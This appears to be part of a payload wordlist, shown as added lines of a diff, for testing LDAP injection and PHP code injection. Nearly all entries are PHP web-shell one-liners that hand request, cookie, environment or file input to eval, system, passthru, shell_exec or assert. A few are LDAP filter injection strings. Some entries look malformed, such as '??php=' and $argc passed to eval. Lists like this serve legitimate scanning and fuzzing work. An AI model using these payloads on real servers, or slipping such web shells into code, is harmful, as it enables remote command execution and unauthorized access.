+LDAPInjection#LDAPInjection?(&(postalAddress=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(co=*)))
+LDAPInjection#LDAPInjection?(&(co=*))(|(uid=*)))
+PHPCodeInjection#PHPCodeInjection??php=system($_GET['cmd']);?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($_GET['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($_GET['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($_GET['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($_GET['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php assert($_GET['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($_POST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($_POST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($_POST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($_POST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php assert($_POST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($_REQUEST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($_REQUEST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($_REQUEST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($_REQUEST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php assert($_REQUEST['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($HTTP_GET_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($HTTP_GET_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($HTTP_GET_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($HTTP_GET_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php assert($HTTP_GET_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($HTTP_POST_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($HTTP_POST_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($HTTP_POST_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($HTTP_POST_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php assert($HTTP_POST_VARS['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($GLOBALS['HTTP_GET_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($GLOBALS['HTTP_GET_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($GLOBALS['HTTP_GET_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($GLOBALS['HTTP_GET_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php assert($GLOBALS['HTTP_GET_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($GLOBALS['HTTP_POST_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($GLOBALS['HTTP_POST_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($GLOBALS['HTTP_POST_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($GLOBALS['HTTP_POST_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php assert($GLOBALS['HTTP_POST_VARS']['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($_SERVER['QUERY_STRING']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($_SERVER['QUERY_STRING']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($_SERVER['QUERY_STRING']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($_SERVER['QUERY_STRING']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($_COOKIE['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($_COOKIE['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($_COOKIE['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($_COOKIE['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($argv[1]); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($argv[1]); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($argv[1]); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($argv[1]); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($argc); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($argc); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($argc); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($argc); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($_ENV['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($_ENV['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($_ENV['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($_ENV['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php eval($_FILES['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php system($_FILES['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php passthru($_FILES['cmd']); ?>
+PHPCodeInjection#PHPCodeInjection?<?php shell_exec($_FILES['cmd']); ?>
